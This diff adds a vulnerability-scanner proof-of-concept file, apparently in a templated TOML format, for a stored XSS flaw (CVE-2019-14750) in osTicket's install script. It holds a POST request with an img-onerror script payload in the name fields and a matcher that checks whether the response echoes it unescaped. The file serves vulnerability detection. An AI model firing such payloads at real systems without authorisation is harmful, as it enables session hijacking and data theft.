@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "验证 osTicket 存储型 XSS 漏洞（CVE-2019-14750）。该漏洞存在于 setup/install.php 的 firstname 和 lastname 字段，由于未对输入进行过滤转义，攻击者可插入恶意脚本并在管理员浏览器中执行，导致会话劫持或数据窃取。本 PoC 通过向安装脚本提交包含 XSS 载荷的字段并检测响应中是否保留未转义脚本，来验证漏洞是否存在。"
+id = "POC-AVE-2019-0081"
+name = "osTicket < 1.12.1 Cross-Site Scripting PoC"
+severity = "medium"
+tags = ["ave-2019-0081"]
+vuln_id = [
+    "CVE-2019-14750",
+    "AVE-2019-0081",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/upload/setup/install.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "s=install&name=testuser&email=test@example.com&lang_id=en_US&fname=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3B%3E&lname=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%281%29%3B%3E&admin_email=test@example.com&username=testuser&passwd=TestPass123&passwd2=TestPass123&prefix=ost_&dbhost=localhost&dbname=testdb&dbuser=root&dbpass=root&timezone=Asia%2FShanghai"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<img src=x onerror=alert(1);>"]
